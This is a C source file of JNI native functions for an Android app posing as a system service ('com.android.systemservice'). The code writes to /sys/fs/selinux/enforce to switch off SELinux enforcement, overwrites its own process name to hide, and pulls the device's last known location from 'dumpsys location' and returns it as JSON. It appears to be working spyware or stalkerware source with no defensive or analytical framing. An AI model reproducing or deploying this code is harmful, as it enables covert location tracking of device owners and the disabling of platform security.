#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

extern char *__progname;
extern char **__environ;

JNIEXPORT jint JNICALL
Java_com_android_systemservice_NativeBridge_disableSELinux(JNIEnv *env, jclass clazz) {
    FILE *fp = fopen("/sys/fs/selinux/enforce", "r");
    if (!fp) return -1;
    int enforcing = fgetc(fp) - '0';
    fclose(fp);

    if (enforcing == 1) {
        fp = fopen("/sys/fs/selinux/enforce", "w");
        if (!fp) return -1;
        fprintf(fp, "0");
        fclose(fp);
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_android_systemservice_NativeBridge_maskProcessName(JNIEnv *env, jclass clazz,
                                                             jstring name) {
    const char *new_name = (*env)->GetStringUTFChars(env, name, NULL);
    if (!new_name) return -1;

    size_t new_len = strlen(new_name);
    size_t old_len = strlen(__progname);
    if (new_len <= old_len) {
        memset((void *) __progname, 0, old_len);
        memcpy((void *) __progname, new_name, new_len);
    }

    (*env)->ReleaseStringUTFChars(env, name, new_name);
    return 0;
}

JNIEXPORT jstring JNICALL
Java_com_android_systemservice_NativeBridge_getGeolocationNative(JNIEnv *env, jclass clazz) {
    FILE *fp = popen("/system/bin/dumpsys location", "r");
    if (!fp) return NULL;

    size_t cap = 65536;
    char *content = malloc(cap);
    if (!content) { pclose(fp); return NULL; }

    size_t total = 0;
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp) != NULL) {
        size_t len = strlen(buf);
        if (total + len < cap - 1) {
            memcpy(content + total, buf, len);
            total += len;
        }
    }
    content[total] = '\0';
    pclose(fp);

    double lat = 0.0, lon = 0.0, acc = 0.0, alt = 0.0;
    char provider[32] = "unknown";
    int found = 0;

    char *section = strstr(content, "Last Known Locations:");
    if (section) {
        const char *providers[] = {"gps", "network", "passive"};
        for (int i = 0; i < 3 && !found; i++) {
            char needle[64];
            snprintf(needle, sizeof(needle), "%s: Location[%s ", providers[i], providers[i]);
            char *entry = strstr(section, needle);
            if (!entry) continue;

            char *vals = entry + strlen(needle) - strlen(providers[i]) - 1;
            if (sscanf(vals, "%lf,%lf", &lat, &lon) == 2) {
                char *hacc = strstr(entry, "hAcc=");
                if (hacc) sscanf(hacc, "hAcc=%lf", &acc);
                char *alt_s = strstr(entry, "alt=");
                if (alt_s) sscanf(alt_s, "alt=%lf", &alt);
                snprintf(provider, sizeof(provider), "%s", providers[i]);
                found = 1;
            }
        }
    }
    free(content);

    if (!found) return NULL;

    time_t now = time(NULL);
    struct tm *tm_info = gmtime(&now);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", tm_info);

    char json[512];
    snprintf(json, sizeof(json),
             "{\"latitude\":%.6f,\"longitude\":%.6f,\"altitude\":%.1f,"
             "\"accuracy\":%.1f,\"provider\":\"%s\","
             "\"timestamp\":\"%s\"}",
             lat, lon, alt, acc, provider, ts);

    return (*env)->NewStringUTF(env, json);
}
